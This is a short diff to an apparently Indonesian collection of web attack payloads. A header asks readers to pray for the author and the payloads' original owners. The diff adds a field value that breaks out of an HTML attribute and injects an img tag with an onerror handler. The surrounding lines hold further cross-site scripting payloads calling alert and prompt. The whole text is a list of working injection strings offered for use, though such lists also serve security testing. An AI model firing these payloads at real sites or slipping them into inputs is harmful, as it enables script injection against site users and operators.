@@ -4,6 +4,8 @@ PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANAPUN, 
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 
+"nama":"test\"><img/src/onerror=alert`Test`>"
+
 {"type":"null","html":"<img/src/onerror=alert`Test`>"}
 
 #"><img src=x onerror=prompt(1);>
